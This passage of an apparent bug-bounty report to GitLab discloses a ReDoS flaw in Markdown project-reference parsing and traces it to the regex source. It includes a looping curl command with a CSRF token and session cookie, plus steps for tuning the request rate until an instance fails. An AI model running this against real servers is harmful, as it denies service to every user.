data-sourcepos="53:1-53:86">&#x000A;<td data-sourcepos="53:2-53:34"><code data-sourcepos="53:4-53:21">[CSRF_TOKEN_VALUE]</code></td>&#x000A;<td data-sourcepos="53:36-53:83">the content of <code data-sourcepos="53:53-53:62">csrf-token</code> noted in step 6</td>&#x000A;</tr>&#x000A;<tr data-sourcepos="54:1-54:86">&#x000A;<td data-sourcepos="54:2-54:34"><code data-sourcepos="54:4-54:18">[SESSION_VALUE]</code></td>&#x000A;<td data-sourcepos="54:36-54:83">the value of <code data-sourcepos="54:51-54:65">_gitlab_session</code> noted in step 7</td>&#x000A;</tr>&#x000A;<tr data-sourcepos="55:1-55:86">&#x000A;<td data-sourcepos="55:2-55:34"><code data-sourcepos="55:4-55:25">[BASE_URL_WITH_SCHEME]</code></td>&#x000A;<td data-sourcepos="55:36-55:83">&#x000A;<strong data-sourcepos="55:37-55:64">the base URL with scheme</strong> noted in step 3</td>&#x000A;</tr>&#x000A;<tr data-sourcepos="56:1-56:84">&#x000A;<td data-sourcepos="56:2-56:34"><code data-sourcepos="56:4-56:22">[PUBLIC_GROUP_NAME]</code></td>&#x000A;<td data-sourcepos="56:36-56:83">&#x000A;<strong data-sourcepos="56:37-56:61">the public group name</strong> noted in step 3</td>&#x000A;</tr>&#x000A;</tbody>&#x000A;</table>&#x000A;<p data-sourcepos="58:1-58:59" dir="auto">For reference, here's an example in my local environment:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="59:1-61:3" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">ruby -e 'while true do p spawn("curl --header Content-Type:application/json --header X-CSRF-Token:E_NhtPEqA7IpGGSH0jgsfRtruz5fAeeqRxQgBn-kl2mCkdxxBHP4HC9YdK6_mDdZqxCkhzkjSzESZOvAGwJQPQ --header Cookie:_gitlab_session=26c454aeadefc013a10a0fdddabcfd12 --data [@]ProjectReferenceFilter_ReDoS_payload.json http://my-gitlab-h1.test/groups/public_group_for_test/preview_markdown"); sleep 1; end'  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<ol data-sourcepos="63:1-66:0" start="10" dir="auto">&#x000A;<li data-sourcepos="63:1-63:134">Change the current directory of the command console to the directory where <code data-sourcepos="63:81-63:121">ProjectReferenceFilter_ReDoS_payload.json</code> is saved.</li>&#x000A;<li data-sourcepos="64:1-66:0">Run the command constructed in step 9 in the command console, and confirm the significant consumption of CPU resource.<br data-sourcepos="64:125-64:125">&#x000A;For reference, when I ran the above command, the CPU resource of my instance with 16 CPU cores and 32GB of memory was quickly exhausted.</li>&#x000A;</ol>&#x000A;<p data-sourcepos="67:1-67:126" dir="auto"><a class="no-attachment-icon" href="https://user-content.gitlab-static.net/83a86d94b9a52965bb7e89a661519d599ffc1f10/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33303536323261342d393365362d346232372d383035622d6331303762303632666432342f68746f705f616c6c5f636f7265735f6578686175737465642e706e67" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/305622a4-93e6-4b27-805b-c107b062fd24/htop_all_cores_exhausted.png"><img data-sourcepos="67:1-67:126" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="htop_all_cores_exhausted.png" data-canonical-src="https://h1.sec.gitlab.net/a/305622a4-93e6-4b27-805b-c107b062fd24/htop_all_cores_exhausted.png" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/83a86d94b9a52965bb7e89a661519d599ffc1f10/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33303536323261342d393365362d346232372d383035622d6331303762303632666432342f68746f705f616c6c5f636f7265735f6578686175737465642e706e67"></a></p>&#x000A;<p data-sourcepos="69:1-69:327" dir="auto">In an instance with performance close to the <a data-sourcepos="69:46-69:186" href="https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html" rel="nofollow noreferrer noopener" target="_blank">1k Reference Architecture (with 8 CPU cores, 7.2GB memory)</a>, this CPU resource consumption causes noticeable performance degradation in tens of seconds, and visibly delays response to all other users.</p>&#x000A;<p data-sourcepos="71:1-71:106" dir="auto"><a class="no-attachment-icon" href="https://user-content.gitlab-static.net/35143e47a1493218fed89a75151b9a47f856f728/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61636238373635632d373434352d346363322d396361362d6564656536396263343366322f726573706f6e73655f64656c61792e706e67" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/acb8765c-7445-4cc2-9ca6-edee69bc43f2/response_delay.png"><img data-sourcepos="71:1-71:106" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="response_delay.png" data-canonical-src="https://h1.sec.gitlab.net/a/acb8765c-7445-4cc2-9ca6-edee69bc43f2/response_delay.png" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/35143e47a1493218fed89a75151b9a47f856f728/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61636238373635632d373434352d346363322d396361362d6564656536396263343366322f726573706f6e73655f64656c61792e706e67"></a></p>&#x000A;<p data-sourcepos="73:1-73:151" dir="auto">Unless the crafted command is interrupted, this performance degradation will continue and get worse until the instance becomes completely unresponsive.</p>&#x000A;<p data-sourcepos="75:1-75:161" dir="auto"><em data-sourcepos="75:1-75:161">NOTE: If you can confirm a surge in CPU usage at step 11, that's enough confirmation that this bug is a valid ReDoS vulnerability, based on past valid reports.</em></p>&#x000A;<p data-sourcepos="77:1-77:161" dir="auto"><em data-sourcepos="77:1-77:161">NOTE 2: This crafted command will keep sending requests until you force it to stop. Please be sure to terminate the command after confirming the vulnerability.</em></p>&#x000A;<h6 data-sourcepos="79:1-79:58" dir="auto">&#x000A;<a id="user-content-details-about-the-command-constructed-in-step-9" class="anchor" href="#details-about-the-command-constructed-in-step-9" aria-hidden="true"></a>Details about the command constructed in step 9:</h6>&#x000A;<p data-sourcepos="80:1-81:218" dir="auto">The executed command send 1 request per second, and each 1 request that triggers ReDoS exhaust the resources of 1 CPU core.<br data-sourcepos="80:126-80:126">&#x000A;The GitLab instance has the default timeout of 60 seconds per request. However, because the load per request is too high, there are many worker processes that do not finish processing even after the timeout has passed.</p>&#x000A;<h4 data-sourcepos="84:1-84:84" dir="auto">&#x000A;<a id="user-content-additional-informations-to-confirm-this-vulnerability-meets-the-ah-criteria" class="anchor" href="#additional-informations-to-confirm-this-vulnerability-meets-the-ah-criteria" aria-hidden="true"></a>Additional informations to confirm this vulnerability meets the <code data-sourcepos="84:72-84:74">A:H</code> criteria</h4>&#x000A;<p data-sourcepos="86:1-86:284" dir="auto"><strong data-sourcepos="86:1-86:284"><em data-sourcepos="86:3-86:282">IMPORTANT NOTE: This section contains additional information to confirm that this vulnerability meets the criteria for <code data-sourcepos="86:124-86:126">A:H</code>. Please use this information after triage, as this section contains time-consuming steps and may be an over-verification of whether this report is valid.</em></strong></p>&#x000A;<p data-sourcepos="88:1-90:69" dir="auto">If the GitLab instance is attacked at a well-tuned RPS(requests per second) rate for a reasonable amount of time, then as long as the attack continues, the instance will take 60+ seconds to process every single request.<br data-sourcepos="88:222-88:222">&#x000A;This indicates that timeouts are not working well under heavy load.<br data-sourcepos="89:70-89:70">&#x000A;As a result, <code data-sourcepos="90:15-90:23">500 error</code> will be returned for each and every request.</p>&#x000A;<p data-sourcepos="92:1-92:96" dir="auto"><a class="no-attachment-icon" href="https://user-content.gitlab-static.net/75416d175746901d20551cf6f9756d1f3c506ef0/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61383434313037362d326665352d343936342d393937332d3362613762333530646333642f3530305f6572726f722e706e67" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/a8441076-2fe5-4964-9973-3ba7b350dc3d/500_error.png"><img data-sourcepos="92:1-92:96" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="500_error.png" data-canonical-src="https://h1.sec.gitlab.net/a/a8441076-2fe5-4964-9973-3ba7b350dc3d/500_error.png" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/75416d175746901d20551cf6f9756d1f3c506ef0/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61383434313037362d326665352d343936342d393937332d3362613762333530646333642f3530305f6572726f722e706e67"></a></p>&#x000A;<p data-sourcepos="94:1-94:182" dir="auto">I describe below how to attack at a well-tuned RPS rate for a reasonable amount of time <strong data-sourcepos="94:89-94:166">by using the command constructed in step 9 of "Steps to reproduce" section</strong> of this report.</p>&#x000A;<ol data-sourcepos="96:1-112:0" dir="auto">&#x000A;<li data-sourcepos="96:1-97:0">&#x000A;<p data-sourcepos="96:4-96:225">Before running the constructed command, maintain separate session as an authenticated user by signing into the instance with a different browser than the one that obtained the unauthenticated user's CSRF token and session.</p>&#x000A;</li>&#x000A;<li data-sourcepos="98:1-105:0">&#x000A;<p data-sourcepos="98:4-100:131">Iterate on executing the constructed command and adjusting the RPS rate.<br data-sourcepos="98:78-98:78">&#x000A;The constructed command will display the PIDs of the spawned <code data-sourcepos="99:66-99:69">curl</code> processes and the responses from the instance in the console.<br data-sourcepos="99:135-99:135">&#x000A;Please adjust the RPS rate as described below so that 1 or 2 PIDs and several <code data-sourcepos="100:83-100:91">500 error</code> responses are alternately displayed.</p>&#x000A;<ul data-sourcepos="101:4-103:0">&#x000A;<li data-sourcepos="101:4-101:234">We can adjust the RPS rate by changing the <code data-sourcepos="101:50-101:54">sleep</code> value at the end of the command. For example, changing to <code data-sourcepos="101:116-101:123">sleep 1;</code> will result in <code data-sourcepos="101:142-101:148">RPS = 1</code>, <code data-sourcepos="101:153-101:162">sleep 0.5;</code> will result in <code data-sourcepos="101:181-101:187">RPS = 2</code>, and <code data-sourcepos="101:196-101:203">sleep 2;</code> will result in <code data-sourcepos="101:222-101:230">RPS = 0.5</code>.</li>&#x000A;<li data-sourcepos="102:4-103:0">We need to adjust the RPS rate so that <a data-sourcepos="102:45-102:202" href="https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/#clarifying-notes" rel="nofollow noreferrer noopener" target="_blank">it does not exceed the "Test RPS rates" (discribed in "Clarifying notes")</a>. As an example, for the <a data-sourcepos="102:228-102:335" href="https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html" rel="nofollow noreferrer noopener" target="_blank">1k Reference Architecture</a>, "Test RPS rates" is 2 RPS.</li>&#x000A;</ul>&#x000A;<p data-sourcepos="104:4-104:321"><em data-sourcepos="104:4-104:321">NOTE: Since the default timeout is 60 seconds, we need to wait a few minutes after executing the command to see the PID and error response alternately displayed. There is no problem if the PIDs is displayed continuously occasionally, but if it is clearly not working, please stop the command and adjust the RPS rate.</em></p>&#x000A;</li>&#x000A;<li data-sourcepos="106:1-112:0">&#x000A;<p data-sourcepos="106:4-108:180"><strong data-sourcepos="106:4-106:43">With the tuned command still running</strong>, visit any page on the instance with the authenticated user's session maintained in step 1 of this section.<br data-sourcepos="106:154-106:154">&#x000A;And check if the <code data-sourcepos="107:22-107:30">500 error</code> is returned after a response delay of 60+ seconds.<br data-sourcepos="107:85-107:85">&#x000A;After you start getting <code data-sourcepos="108:29-108:38">500 errors</code> for authenticated requests, wait tens of minutes and you'll start getting <code data-sourcepos="108:116-108:125">500 errors</code> for unauthenticated requests and requests to the API.</p>&#x000A;<p data-sourcepos="110:4-110:144"><em data-sourcepos="110:4-110:144">NOTE: This behavior seems to occur because handling authenticated requests tends to be more complex than handling unauthenticated requests.</em></p>&#x000A;</li>&#x000A;</ol>&#x000A;<p data-sourcepos="113:1-114:214" dir="auto">When I tested it on my instance, it took about 10-20 minutes at a rate of 1 RPS for my instance (16 CPU cores and 32GB of memory) to reach the above DoS state.<br data-sourcepos="113:162-113:162">&#x000A;Additionally, in a pipeline that started overlapping the above DoS state, the jobs failed with timeout because the runner was unable to communicate with the instance, and subsequent job on the pipeline was not run.</p>&#x000A;<p data-sourcepos="116:1-117:116" dir="auto"><a class="no-attachment-icon" href="https://user-content.gitlab-static.net/18951d43279a2b0a1b317d05a6a5379fbb940e88/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f62666466343338652d373064632d343937662d386336652d3335303733353961376265632f6661696c65645f706970656c696e652e706e67" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/bfdf438e-70dc-497f-8c6e-3507359a7bec/failed_pipeline.png"><img data-sourcepos="116:1-116:108" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="failed_pipeline.png" data-canonical-src="https://h1.sec.gitlab.net/a/bfdf438e-70dc-497f-8c6e-3507359a7bec/failed_pipeline.png" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/18951d43279a2b0a1b317d05a6a5379fbb940e88/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f62666466343338652d373064632d343937662d386336652d3335303733353961376265632f6661696c65645f706970656c696e652e706e67"></a><br data-sourcepos="116:111-116:111">&#x000A;<a class="no-attachment-icon" href="https://user-content.gitlab-static.net/b3611e2c1bd40b68c42e504160c69cde68f081e7/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30636637653965632d316237632d343562652d396165342d3037376563386431336562632f6661696c65645f6a6f62735f74696d656f75742e706e67" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/0cf7e9ec-1b7c-45be-9ae4-077ec8d13ebc/failed_jobs_timeout.png"><img data-sourcepos="117:1-117:116" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="failed_jobs_timeout.png" data-canonical-src="https://h1.sec.gitlab.net/a/0cf7e9ec-1b7c-45be-9ae4-077ec8d13ebc/failed_jobs_timeout.png" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/b3611e2c1bd40b68c42e504160c69cde68f081e7/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30636637653965632d316237632d343562652d396165342d3037376563386431336562632f6661696c65645f6a6f62735f74696d656f75742e706e67"></a></p>&#x000A;<p data-sourcepos="119:1-119:116" dir="auto">Also, when I looked at the runner logs in this state, I could see that the runner was failing to pick up the jobs.</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="120:1-127:5" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">$ sudo docker logs my_runner_container  </span>&#x000A;<span id="LC2" class="line" lang="plaintext">[...snip...]  </span>&#x000A;<span id="LC3" class="line" lang="plaintext">WARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  </span>&#x000A;<span id="LC4" class="line" lang="plaintext">WARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  </span>&#x000A;<span id="LC5" class="line" lang="plaintext">WARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  </span>&#x000A;<span id="LC6" class="line" lang="plaintext">WARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="128:1-128:192" dir="auto">(Since I was using the <a data-sourcepos="128:24-128:126" href="https://docs.gitlab.com/runner/install/docker.html#docker-images" rel="nofollow noreferrer noopener" target="_blank"><code data-sourcepos="128:26-128:52">gitlab/gitlab-runner:alpine</code> image</a> for testing, I ran <code data-sourcepos="128:148-128:158">docker logs</code> command to see the runner logs.)</p>&#x000A;<p data-sourcepos="130:1-130:195" dir="auto">These mean that the instance has been completely taken down, so this vulnerability fully meets <a data-sourcepos="130:96-130:194" href="https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/#clarifying-notes" rel="nofollow noreferrer noopener" target="_blank"><code data-sourcepos="130:98-130:100">A:H</code> criteria</a>.</p>&#x000A;<h4 data-sourcepos="133:1-133:39" dir="auto">&#x000A;<a id="user-content-what-is-the-current-bug-behavior" class="anchor" href="#what-is-the-current-bug-behavior" aria-hidden="true"></a>What is the current bug behavior?</h4>&#x000A;<p data-sourcepos="135:1-136:95" dir="auto">Although the behavior of this ReDoS bug isn't overly complicated, it's a bit tedious to get to the root cause from the observed DoS state.<br data-sourcepos="135:141-135:141">&#x000A;So I would like to explain this bug step by step by looking at the stack trace and source code.</p>&#x000A;<p data-sourcepos="138:1-138:124" dir="auto">Looking at the stack trace at timeout, at first glance <code data-sourcepos="138:57-138:78">ProjectReferenceFilter</code> does not seem to be the cause of this bug.</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="139:1-146:3" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">lib/banzai/filter/references/reference_filter.rb:209:in `replace_text_when_pattern_matches'  </span>&#x000A;<span id="LC2" class="line" lang="plaintext">lib/banzai/filter/references/reference_filter.rb:50:in `block in call'  </span>&#x000A;<span id="LC3" class="line" lang="plaintext">lib/banzai/filter/references/reference_filter.rb:48:in `each'  </span>&#x000A;<span id="LC4" class="line" lang="plaintext">lib/banzai/filter/references/reference_filter.rb:48:in `each_with_index'  </span>&#x000A;<span id="LC5" class="line" lang="plaintext">lib/banzai/filter/references/reference_filter.rb:48:in `call'  </span>&#x000A;<span id="LC6" class="line" lang="plaintext">(...snip...)  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="148:1-148:79" dir="auto">Let's look at the line 209 in <code data-sourcepos="148:32-148:50">reference_filter.rb</code> where the timeout occurred.</p>&#x000A;<p data-sourcepos="150:1-150:115" dir="auto"><a href="https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/reference_filter.rb#L208-209">https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/reference_filter.rb#L208-209</a></p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="151:1-154:3" data-canonical-lang="ruby" class="code highlight js-syntax-highlight language-ruby" lang="ruby" v-pre="true"><code><span id="LC1" class="line" lang="ruby">        <span class="k">def</span> <span class="nf">replace_text_when_pattern_matches</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">pattern</span><span class="p">)</span>  </span>&#x000A;<span id="LC2" class="line" lang="ruby">          <span class="k">return</span> <span class="k">unless</span> <span class="n">node</span><span class="p">.</span><span class="nf">text</span> <span class="o">=~</span> <span class="n">pattern</span>  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="156:1-157:112" dir="auto">There is no doubt that a ReDoS has occurred because of <code data-sourcepos="156:57-156:76">node.text =~ pattern</code>.<br data-sourcepos="156:81-156:81">&#x000A;Let's take a look at the code on line 50 that calls <code data-sourcepos="157:54-157:103">ReferenceFilter::replace_text_when_pattern_matches</code> method.</p>&#x000A;<p data-sourcepos="159:1-159:113" dir="auto"><a href="https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/reference_filter.rb#L45-50">https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/reference_filter.rb#L45-50</a></p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="160:1-167:3" data-canonical-lang="ruby" class="code highlight js-syntax-highlight language-ruby" lang="ruby" v-pre="true"><code><span id="LC1" class="line" lang="ruby">        <span class="k">def</span> <span class="nf">call</span>  </span>&#x000A;<span id="LC2" class="line" lang="ruby">          <span class="n">ref_pattern_start</span> <span class="o">=</span> <span class="sr">/\A</span><span class="si">#{</span><span class="n">object_reference_pattern</span><span class="si">}</span><span class="sr">\z/</span></span>&#x000A;<span id="LC3" class="line" lang="ruby"></span>&#x000A;<span id="LC4" class="line" lang="ruby">          <span class="n">nodes</span><span class="p">.</span><span class="nf">each_with_index</span> <span class="k">do</span> <span class="o">|</span><span class="n">node</span><span class="p">,</span> <span class="n">index</span><span class="o">|</span>  </span>&#x000A;<span id="LC5" class="line" lang="ruby">            <span class="k">if</span> <span class="n">text_node?</span><span class="p">(</span><span class="n">node</span><span class="p">)</span>  </span>&#x000A;<span id="LC6" class="line" lang="ruby">              <span class="n">replace_text_when_pattern_matches</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">object_reference_pattern</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">content</span><span class="o">|</span>  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="169:1-170:128" dir="auto">This <code data-sourcepos="169:7-169:10">call</code> method gets the regex pattern by calling <code data-sourcepos="169:55-169:83">self.object_reference_pattern</code>.<br data-sourcepos="169:88-169:88">&#x000A;When I added the debug code below and tested it, I found that <code data-sourcepos="170:64-170:73">self.class</code> just before the timeout was <code data-sourcepos="170:105-170:126">ProjectReferenceFilter</code>.</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="172:1-181:3" data-canonical-lang="diff" class="code highlight js-syntax-highlight language-diff" lang="diff" v-pre="true"><code><span id="LC1" class="line" lang="diff">        def call  </span>&#x000A;<span id="LC2" class="line" lang="diff">          ref_pattern_start = /\A#{object_reference_pattern}\z/  </span>&#x000A;<span id="LC3" class="line" lang="diff"><span class="gi">+</span></span>&#x000A;<span id="LC4" class="line" lang="diff"><span class="gi">+         puts self.class.inspect       #=&gt; Banzai::Filter::References::ProjectReferenceFilter</span></span>&#x000A;<span id="LC5" class="line" lang="diff"></span>&#x000A;<span id="LC6" class="line" lang="diff">          nodes.each_with_index do |node, index|  </span>&#x000A;<span id="LC7" class="line" lang="diff">            if text_node?(node)  </span>&#x000A;<span id="LC8" class="line" lang="diff">              replace_text_when_pattern_matches(node, index, object_reference_pattern) do |content|  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="183:1-183:83" dir="auto">Let's look at the definitions of <code data-sourcepos="183:35-183:81">ProjectReferenceFilter.object_reference_pattern</code>.</p>&#x000A;<p data-sourcepos="185:1-185:121" dir="auto"><a href="https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/project_reference_filter.rb#L30-32">https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/project_reference_filter.rb#L30-32</a></p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="186:1-190:3" data-canonical-lang="ruby" class="code highlight js-syntax-highlight language-ruby" lang="ruby" v-pre="true"><code><span id="LC1" class="line" lang="ruby">        <span class="k">def</span> <span class="nf">object_reference_pattern</span>  </span>&#x000A;<span id="LC2" class="line" lang="ruby">          <span class="p">[</span><span class="err">@</span><span class="p">]</span><span class="n">object_reference_pattern</span> <span class="o">||=</span> <span class="no">Project</span><span class="p">.</span><span class="nf">markdown_reference_pattern</span>  </span>&#x000A;<span id="LC3" class="line" lang="ruby">        <span class="k">end</span>  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="192:1-193:70" dir="auto">It looks like we will reach the goal soon.<br data-sourcepos="192:45-192:45">&#x000A;Let's look at the definitions of <code data-sourcepos="193:35-193:68">Project.markdown_reference_pattern</code>.</p>&#x000A;<p data-sourcepos="195:1-195:88" dir="auto"><a href="https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/app/models/project.rb#L915-921">https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/app/models/project.rb#L915-921</a></p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="196:1-204:3" data-canonical-lang="ruby" class="code highlight js-syntax-highlight language-ruby" lang="ruby" v-pre="true"><code><span id="LC1" class="line" lang="ruby">    <span class="k">def</span> <span class="nf">markdown_reference_pattern</span>  </span>&#x000A;<span id="LC2" class="line" lang="ruby">      <span class="p">[</span><span class="err">@</span><span class="p">]</span><span class="n">markdown_reference_pattern</span> <span class="o">||=</span>  </span>&#x000A;<span id="LC3" class="line" lang="ruby">        <span class="sr">%r{  </span></span>&#x000A;<span id="LC4" class="line" lang="ruby"><span class="sr">          </span><span class="si">#{</span><span class="n">reference_pattern</span><span class="si">}</span><span class="sr">  </span></span>&#x000A;<span id="LC5" class="line" lang="ruby"><span class="sr">          (</span><span class="si">#{</span><span class="n">reference_postfix</span><span class="si">}</span><span class="sr">|</span><span class="si">#{</span><span class="n">reference_postfix_escaped</span><span class="si">}</span><span class="sr">)  </span></span>&#x000A;<span id="LC6" class="line" lang="ruby"><span class="sr">        }x</span>  </span>&#x000A;<span id="LC7" class="line" lang="ruby">    <span class="k">end</span>  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="206:1-206:111" dir="auto">Let's also look at the definitions of <code data-sourcepos="206:40-206:56">reference_pattern</code>, <code data-sourcepos="206:61-206:77">reference_postfix</code> and <code data-sourcepos="206:85-206:109">reference_postfix_escaped</code>.</p>&#x000A;<p data-sourcepos="208:1-208:88" dir="auto"><a href="https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/app/models/project.rb#L896-910">https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/app/models/project.rb#L896-910</a></p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="209:1-225:3" data-canonical-lang="ruby" class="code highlight js-syntax-highlight language-ruby" lang="ruby" v-pre="true"><code><span id="LC1" class="line" lang="ruby">    <span class="k">def</span> <span class="nf">reference_pattern</span>  </span>&#x000A;<span id="LC2" class="line" lang="ruby">      <span class="sr">%r{  </span></span>&#x000A;<span id="LC3" class="line" lang="ruby"><span class="sr">        (?&lt;!</span><span class="si">#{</span><span class="no">Gitlab</span><span class="o">::</span><span class="no">PathRegex</span><span class="o">::</span><span class="no">PATH_START_CHAR</span><span class="si">}</span><span class="sr">)  </span></span>&#x000A;<span id="LC4" class="line" lang="ruby"><span class="sr">        ((?&lt;namespace&gt;</span><span class="si">#{</span><span class="no">Gitlab</span><span class="o">::</span><span class="no">PathRegex</span><span class="o">::</span><span class="no">FULL_NAMESPACE_FORMAT_REGEX</span><span class="si">}</span><span class="sr">)/)?  </span></span>&#x000A;<span id="LC5" class="line" lang="ruby"><span class="sr">        (?&lt;project&gt;</span><span class="si">#{</span><span class="no">Gitlab</span><span class="o">::</span><span class="no">PathRegex</span><span class="o">::</span><span class="no">PROJECT_PATH_FORMAT_REGEX</span><span class="si">}</span><span class="sr">)  </span></span>&#x000A;<span id="LC6" class="line" lang="ruby"><span class="sr">      }xo</span>  </span>&#x000A;<span id="LC7" class="line" lang="ruby">    <span class="k">end</span></span>&#x000A;<span id="LC8" class="line" lang="ruby"></span>&#x000A;<span id="LC9" class="line" lang="ruby">    <span class="k">def</span> <span class="nf">reference_postfix</span>  </span>&#x000A;<span id="LC10" class="line" lang="ruby">      <span class="s1">'&gt;'</span>  </span>&#x000A;<span id="LC11" class="line" lang="ruby">    <span class="k">end</span></span>&#x000A;<span id="LC12" class="line" lang="ruby"></span>&#x000A;<span id="LC13" class="line" lang="ruby">    <span class="k">def</span> <span class="nf">reference_postfix_escaped</span>  </span>&#x000A;<span id="LC14" class="line" lang="ruby">      <span class="s1">'&amp;gt;'</span>  </span>&#x000A;<span id="LC15" class="line" lang="ruby">    <span class="k">end</span>  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="227:1-228:113" dir="auto"><code data-sourcepos="227:2-227:35">Project.markdown_reference_pattern</code> method builds the final regex pattern by combining <code data-sourcepos="227:90-227:106">reference_pattern</code>, <code data-sourcepos="227:111-227:127">reference_postfix</code> and <code data-sourcepos="227:135-227:159">reference_postfix_escaped</code>.<br data-sourcepos="227:164-227:164">&#x000A;So, the regex pattern that is finally constructed by <code data-sourcepos="228:55-228:88">Project.markdown_reference_pattern</code> method is as follows:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="229:1-238:3" data-canonical-lang="ruby" class="code highlight js-syntax-highlight language-ruby" lang="ruby" v-pre="true"><code><span id="LC1" class="line" lang="ruby"><span class="sr">/</span></span>&#x000A;<span id="LC2" class="line" lang="ruby"><span class="sr">          (?x-mi:  </span></span>&#x000A;<span id="LC3" class="line" lang="ruby"><span class="sr">        (?&lt;![a-zA-Z0-9_\.])  </span></span>&#x000A;<span id="LC4" class="line" lang="ruby"><span class="sr">        ((?&lt;namespace&gt;(?-mix:((?-mix:(?:[a-zA-Z0-9_\.][a-zA-Z0-9_\-\.]*[a-zA-Z0-9_\-]|[a-zA-Z0-9_])(?-mix:(?&lt;!\.git|\.atom)))\/){,20}(?-mix:(?:[a-zA-Z0-9_\.][a-zA-Z0-9_\-\.]*[a-zA-Z0-9_\-]|[a-zA-Z0-9_])(?-mix:(?&lt;!\.git|\.atom)))))\/)?  </span></span>&#x000A;<span id="LC5" class="line" lang="ruby"><span class="sr">        